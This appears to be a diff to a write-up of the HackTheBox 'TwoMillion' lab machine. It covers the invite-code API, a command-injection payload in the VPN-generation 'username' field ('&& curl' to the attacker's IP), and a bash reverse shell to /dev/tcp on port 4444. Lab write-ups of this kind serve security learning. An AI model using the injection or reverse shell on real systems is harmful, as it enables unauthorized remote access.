@@ -54,11 +54,71 @@ Nmap done: 1 IP address (1 host up) scanned in 17.41 seconds
 The HTTP service redirects to 2million.htb, so add it to `/etc/hosts`.
 
 #### 2million.htb - TCP 80 (nginx HTTP)
+
+<img width="945" height="488" alt="image" src="https://github.com/user-attachments/assets/0cf23b81-5f48-4b0a-b683-164ac58b4a07" />
+
+
+
+<img width="1174" height="521" alt="image" src="https://github.com/user-attachments/assets/c234e3a1-4cec-4ce2-8703-f06b0e516a3c" />
+
+<img width="687" height="458" alt="image" src="https://github.com/user-attachments/assets/ccce510e-9726-4472-8e39-9c9bbb23b75c" />
+
+```
+    <!-- scripts -->
+    <script src="/js/htb-frontend.min.js"></script>
+    <script defer src="/js/inviteapi.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            // Retrieve the invite code from localStorage
+            var inviteCode = localStorage.getItem('inviteCode');
+
+            // Fill the input field
+            $('#code').val(inviteCode);
+        });
+    </script>
+```
+```
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
+```
+```
+function verifyInviteCode(code) {
+    var formData = { "code": code };
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        data: formData,
+        url: '/api/v1/invite/verify',
+        success: function(response) {
+            console.log(response)
+        },
+        error: function(response) {
+            console.log(response)
+        }
+    })
+}
+
+function makeInviteCode() {
+    $.ajax({
+        type: "POST",
+        dataType: "json",
+        url: '/api/v1/invite/how/to/generate',
+        success: function(response) {
+            console.log(response)
+        },
+        error: function(response) {
+            console.log(response)
+        }
+    })
+}
+```
+<img width="1045" height="130" alt="image" src="https://github.com/user-attachments/assets/d403da45-194a-45b9-b4a0-fe41f565f849" />
+
 POST /api/v1/invite/how/to/generate HTTP/1.1
 ```
 ╰─ curl -X POST http://2million.htb/api/v1/invite/how/to/generate                                                     
 {"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}%   
 ```
+<img width="690" height="468" alt="image" src="https://github.com/user-attachments/assets/8f51eac6-797b-4fe8-8668-266504a2517b" />
 
 ```
 ╰─ curl -X POST http://2million.htb/api/v1/invite/generate                              
@@ -66,6 +126,9 @@ POST /api/v1/invite/how/to/generate HTTP/1.1
 ```
 
 <img width="808" height="482" alt="image" src="https://github.com/user-attachments/assets/193b73b0-94cc-46ab-a2fa-f4c87fc51c1d" />
+
+
+<img width="1100" height="506" alt="image" src="https://github.com/user-attachments/assets/bca005cb-aaa4-46c6-a105-bec68780a76a" />
 
 ```
 POST /api/v1/user/register HTTP/1.1
@@ -153,11 +216,14 @@ DTIzMDUyNjE1MDIzM1oXDTIzMDYyNTE1MDIzM1owgYgxCzAJBgNVBAYTAlVLMQ8w
 DQYDVQQIDAZMb25kb24xDzANBgNVBAcMBkxvbmRvbjETMBEGA1UECgwKSGFja1Ro
 ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
 ```
-
+```
 ─ curl -X POST -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" -H "Content-Type: application/json" http://2million.htb/api/v1/admin/vpn/generate --data '{"username":"arif2002 && curl 10.10.14.108:8000"}'
-
+```
 <img width="713" height="108" alt="image" src="https://github.com/user-attachments/assets/7da8bd39-3ce6-48b8-b888-13c063071265" />
 
+echo 'bash -i >& /dev/tcp/10.10.14.108/4444 0>&1' | base64
+
+```
 ╰─ curl -X POST \
  -H "Cookie: PHPSESSID=t23gq3uhmm6ucln8gcub8a0mua" \
  -H "Content-Type: application/json" \
@@ -171,7 +237,7 @@ ZUJveDEMMAoGA1UECwwDVlBOMREwDwYDVQQDDAgybWlsbGlvbjEhMB8GCSqGSIb3
 <hr><center>nginx</center>
 </body>
 </html>
-
+```
 
 <img width="882" height="297" alt="image" src="https://github.com/user-attachments/assets/600dbddc-a3f5-412d-9732-f63040717b60" />
 
